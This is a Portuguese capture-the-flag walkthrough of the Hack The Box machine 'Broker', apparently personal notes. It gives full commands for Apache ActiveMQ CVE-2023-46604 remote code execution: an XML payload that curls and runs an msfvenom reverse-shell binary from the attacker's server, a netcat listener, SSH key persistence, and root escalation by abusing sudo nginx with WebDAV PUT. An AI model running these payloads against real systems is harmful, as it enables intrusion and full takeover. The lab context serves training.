Broker
========================

## Enumeration

    sudo nmap -p- -Pn -T5 -n broker.htb | tee nmap_fullportstcp_output.txt

![qownnotes-media-QXZzle](../../../media/qownnotes-media-QXZzle.png)

    sudo nmap -sU -p 53,161,111,137,139,500,2049 -Pn broker.htb | tee nmap_udp_output.txt

![qownnotes-media-LayfiK](../../../media/qownnotes-media-LayfiK.png)

    sudo nmap_enum broker.htb | tee nmap_output.txt

![qownnotes-media-dVgFil](../../../media/qownnotes-media-dVgFil.png)

    sudo nmap -sS --script vuln -n -T5 -Pn broker.htb -p 22,80,1883,5672,8161,39657,61613,61614,61616 | tee nmap_vulns.txt
    
 
## Exploitation
 
    firefox http://broker.htb

Credenciais
admin
admin


![qownnotes-media-mHJuWe](../../../media/qownnotes-media-mHJuWe.png)

https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ/blob/main/poc-linux.xml

Para construir o binário em go ficou:

    sudo apt update
    sudo apt install golang-go
    git clone https://github.com/X1r0z/ActiveMQ-RCE.git
    cd ActiveMQ-RCE/
    go build .
    ./ActiveMQ-RCE -i 10.10.11.243 -u http://10.10.14.9:8001/poc.xml
    msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.9 LPORT=8080 -f elf -o test.elf
    python -m http.server 8001
    └─$ cat poc.xml                                                                                                     
    <?xml version="1.0" encoding="UTF-8" ?>                                                                             
    <beans xmlns="http://www.springframework.org/schema/beans"                                                          
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"                                                            
       xsi:schemaLocation="                                                                                             
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">         
        <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">                                             
            <constructor-arg>
            <list>
                <value>sh</value>
                <value>-c</value>
                <!-- The command below downloads the file and saves it as test.elf -->
                <value>curl -s -o test.elf http://10.10.14.9:8001/test.elf; chmod +x ./test.elf; ./test.elf</value>
            </list>
            </constructor-arg>
        </bean>
    </beans>
    nc -nlvp 8080

## PrivEsc

    python -c 'import pty; pty.spawn("/bin/bash")'
    export TERM=xterm
<Ctrl + Z>

    stty raw -echo; fg
    reset

    sudo -l

![qownnotes-media-HscDpF](../../../media/qownnotes-media-HscDpF.png)

Vamos conseguir uma shell melhor para acessar essa máquina primeiro:

    ssh-keygen -t rsa -b 4096 -C "your_email@example.com"
    
copiar a chave pública par o servidor invadido (geralmente /home/user/.ssh/id_rsa.pub). Depois basta a gente criar no diretório do usuário pelo qual invadimos o seguinte:

    mkdir /home/activemq/.ssh
    cd /home/activemq/.ssh
    vi authorized_keys

    ssh -i .ssh/id_rsa activemq@broker.htb

Depois disso eu criei um arquivo no diretório /tmp com o seguinte conteúdo:

```
activemq@broker:/tmp$ cat config 
user             root;
worker_processes 1;

events {
    # configuration of connection processing
        worker_connections 768;
}

http {
    # Configuration specific to HTTP and affecting all virtual servers  

    server {
        # configuration of HTTP virtual server 1       
        listen 8082;
        server_name 127.0.0.1:8082;
        location / {
                root /;
                dav_methods PUT;
        }
    }
}
activemq@broker:/tmp$
```

Comandos c om o curl que podem ajudar a gente a fazer o upload de arquivo:


    sudo /usr/sbin/nginx -c /tmp/config -s reload
    
    curl -X PUT http://127.0.0.1:8082/root/.ssh/authorized_keys -d "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCauEbpsah1HJTzPR8GXSyqFYULaqSOM6fBjYRp1qM70GIPTGSin25qS76uzC/vHJi48JdvIipLIYcHOFbkFzL8B44Pcdrrb8SKz6CNoLA4wzArcMRlFR4PwPnPBnFuele0wg3NEgps/JsCGLGTJkymcUdml/AIAcNtFA27ThmuoNp1VMrBMW7gKxYXmHV9Umsd+XVMZXlkasprDdQWjUMkWjdno28jv8fltBxTywvDff1Y0N2dhqtPzuv7NHzgXiwCSASG7VlISdMl8gZ8r1qwF7ufgDivWhUX9HcLTv0EbCpfiyhg20ycOI0tcPbH3p5Qsn9r9IqEkvVXuVIHu5CZO3r7Yc382UQbYgRBp0yoZpeGX7V9tsyGm2JKusxGfyyALUuG2OFioOkgwaz1jR9Yh73fAuvhf3PXi63i1YMMui+M3132YcxwKPnDe74qeAiJ4/2j8tIyXCr9T4Oca/AL+rkkYiToDYeY4lRN9Ai01lbi1ujzuy2QyRktmOR7Xfb3iEKL53QdW9NK3LUllCHNC89oMpk90oyFDUuVSZBlJ+xHHir2avNzzGmaMKUP00a0Kx7f+vsg4fxb1tPjYayiJuedDGqys4R3oH6kdGjPCz6jlbhYz2CStxDb8GhAvqzN0D48qB/7/b0JTsNoj/zSBNdPf0rN00jKUD9/kXXsQw== test@test.com"

Já na máquina do atacante:

    ssh-keygen -t rsa -b 4096 -C "test@test.com"
    ssh -i id_rsa_r root@broker.htb

![qownnotes-media-BeSmTK](../../../media/qownnotes-media-BeSmTK.png)
